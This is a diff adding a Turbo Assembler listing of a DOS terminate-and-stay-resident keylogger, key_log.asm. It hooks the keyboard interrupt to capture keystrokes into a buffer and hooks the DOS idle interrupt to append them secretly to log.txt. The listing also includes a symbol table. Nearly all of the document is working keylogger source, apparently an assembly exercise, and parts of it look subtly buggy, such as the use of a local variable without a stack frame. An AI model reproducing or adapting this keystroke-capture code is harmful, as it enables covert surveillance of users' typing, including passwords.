@@ -1,0 +1,181 @@
+Turbo Assembler	 Version 4.1	    03/24/20 15:34:50	    Page 1
+key_log.asm
+
+
+
+      1				     locals @@
+      2				     .186
+      3	0000			     .model tiny
+      4
+      5	0000			     .code
+      6
+      7				     org 100h
+      8
+      9	0100			     Start:
+     10
+     11	0100  6C 6F 67 2E 74 78	74+  FileName	     db	     "log.txt",	0
+     12	      00
+     13	0108  0100*(00)		     buffer	     db	100h dup(0)
+     14	0208  00		     head	     db	0
+     15	0209  00		     tail	     db	0
+     16	020A  00000000		     Old09h	     dd	0
+     17	020E  00000000		     Old28h	     dd	0
+     18
+     19
+     20	0212  B8 3509				     mov     ax, 3509h				     ;Getting 09h interrupt pointer
+     21	0215  CD 21				     int     21h
+     22	0217  89 1E 020Ar			     mov     word ptr Old09h, bx	     ;Saving old 09h interrupt addr
+     23	021B  8C 06 020Cr			     mov     word ptr Old09h+2,	es
+     24	021F  B8 2509				     mov     ax, 2509h
+     25	0222  BA 0249r				     mov     dx, offset	New09h
+     26	0225  CD 21				     int     21h					     ;Pushing new 09h	    +
+     27				     interrupt function
+     28
+     29	0227  B8 3528				     mov     ax, 3528h				     ;Getting 28h interrupt pointer
+     30	022A  CD 21				     int     21h
+     31	022C  89 1E 020Er			     mov     word ptr Old28h, bx	     ;Saving old 28h interrupt addr
+     32	0230  8C 06 0210r			     mov     word ptr Old28h+2,	es
+     33	0234  B8 2528				     mov     ax, 2528h
+     34	0237  BA 026Cr				     mov     dx, offset	New28h
+     35	023A  CD 21				     int     21h					     ;Pushing new 28h	    +
+     36				     interrupt function
+     37
+     38	023C  B8 3100				     mov ax, 3100h
+     39	023F  BA 02B8r				     mov dx, offset EndLabel
+     40	0242  C1 EA 04				     shr dx, 4
+     41	0245  42				     inc dx
+     42	0246  CD 21				     int 21h					     ;Terminate	& Stay resident
+     43
+     44	0248  C3				     ret
+     45
+     46
+     47
+     48				     ;=========================================================
+     49				     ; Reads symbols from keyboard and pushes them into	buffer
+     50				     ;=========================================================
+     51	0249			     New09h  proc
+     52
+     53	0249  60				     pusha
+     54	024A  9C				     pushf
+     55	024B  2E: FF 1E	020Ar			     call dword	ptr cs:[Old09h]	     ;Call old interrupt handler
+     56
+     57	0250  B4 01				     mov ah, 01h
+Turbo Assembler	 Version 4.1	    03/24/20 15:34:50	    Page 2
+key_log.asm
+
+
+
+     58	0252  CD 16				     int 16h					     ;Take keycode
+     59	0254  74 14				     jz	@@Empty					     ;Check if a key is	available
+     60
+     61	0256  2E: FE 06	0208r			     inc cs:[head]			     ;Move head	pointer
+     62	025B  BE 0108r				     mov si, offset buffer
+     63	025E  33 DB				     xor bx, bx
+     64	0260  2E: 8A 1E	0208r			     mov bl, cs:[head]			     ;Count pointer to next
+     65	0265  03 F3				     add si, bx					     ;	     free buffer position
+     66	0267  2E: 88 04				     mov cs:[si], al			     ;Push ASCII code into buffer
+     67	026A			     @@Empty:
+     68	026A  61				     popa
+     69	026B  CF				     iret
+     70	026C					     endp
+     71
+     72
+     73				     ;=========================================================
+     74				     ; Writes symbols from buffer into file
+     75				     ;=========================================================
+     76	026C			     New28h  proc
+     77
+     78	026C  60				     pusha
+     79	026D  9C				     pushf
+     80	026E  2E: FF 1E	020Er			     call dword	ptr cs:[Old28h]	     ;Call old interrupt handler
+     81
+     82						     local last_size:byte
+     83	0273  2E: 8A 0E	0208r			     mov cl, cs:[head]
+     84	0278  2E: 2A 0E	0209r			     sub cl, cs:[tail]
+     85	027D  2E: 88 4E	FE			     mov cs:[last_size], cl	     ;Count curr symbols num in	buffer
+     86
+     87	0281  0E				     push cs
+     88	0282  1F				     pop ds
+     89	0283  BA 0100r				     mov dx, offset FileName
+     90	0286  B8 3D01				     mov ax, 3D01h
+     91	0289  CD 21				     int 21h					     ;Open file	for reading and	get +
+     92				     file handle in AX
+     93
+     94
+     95	028B  33 C9				     xor cx, cx					     ;Set pointer offset CX:DX to 0
+     96	028D  33 D2				     xor dx, dx
+     97	028F  8B D8				     mov bx, ax					     ;Move file	handle from AX to BX
+     98	0291  B8 4202				     mov ax, 4202h
+     99	0294  CD 21				     int 21h					     ;Move file	pointer	to end of   +
+    100				     file
+    101
+    102	0296  2E: 8A 4E	FE			     mov cl, cs:[last_size]	     ;Set number of symbols to write
+    103	029A  BA 0108r				     mov dx, offset buffer
+    104	029D  33 C0				     xor ax, ax
+    105	029F  2E: A0 0209r			     mov al, cs:[tail]
+    106	02A3  03 D0				     add dx, ax					     ;Move buffer pointer to it's   +
+    107				     strart
+    108	02A5  B4 40				     mov ah, 40h
+    109	02A7  CD 21				     int 21h					     ;Write buffer into	file
+    110
+    111	02A9  B4 3E				     mov ah, 3Eh
+    112	02AB  CD 21				     int 21h					     ;Close file
+    113
+    114	02AD  2E: 8A 46	FE			     mov al, cs:[last_size]
+Turbo Assembler	 Version 4.1	    03/24/20 15:34:50	    Page 3
+key_log.asm
+
+
+
+    115	02B1  2E: 00 06	0209r			     add cs:[tail], al			     ;Change tail position
+    116
+    117	02B6  61				     popa
+    118	02B7  CF				     iret
+    119	02B8					     endp
+    120
+    121
+    122	02B8			     EndLabel:
+    123				     end     Start
+Turbo Assembler	 Version 4.1	    03/24/20 15:34:50	    Page 4
+Symbol Table
+
+
+
+
+Symbol Name			  Type	 Value
+
+??DATE				  Text	 "03/24/20"
+??FILENAME			  Text	 "key_log "
+??TIME				  Text	 "15:34:49"
+??VERSION			  Number 040A
+@32BIT				  Text	 0
+@@EMPTY				  Near	 DGROUP:026A
+@CODE				  Text	 DGROUP
+@CODESIZE			  Text	 0
+@CPU				  Text	 0103H
+@CURSEG				  Text	 _TEXT
+@DATA				  Text	 DGROUP
+@DATASIZE			  Text	 0
+@FILENAME			  Text	 KEY_LOG
+@INTERFACE			  Text	 000H
+@MODEL				  Text	 1
+@STACK				  Text	 DGROUP
+@WORDSIZE			  Text	 2
+BUFFER				  Byte	 DGROUP:0108
+ENDLABEL			  Near	 DGROUP:02B8
+FILENAME			  Byte	 DGROUP:0100
+HEAD				  Byte	 DGROUP:0208
+LAST_SIZE			  Number [DGROUP:BP-0002]
+NEW09H				  Near	 DGROUP:0249
+NEW28H				  Near	 DGROUP:026C
+OLD09H				  Dword	 DGROUP:020A
+OLD28H				  Dword	 DGROUP:020E
+START				  Near	 DGROUP:0100
+TAIL				  Byte	 DGROUP:0209
+
+Groups & Segments		  Bit Size Align  Combine Class
+
+DGROUP				  Group
+  _DATA				  16  0000 Word	  Public  DATA
+  _TEXT				  16  02B8 Word	  Public  CODE
+
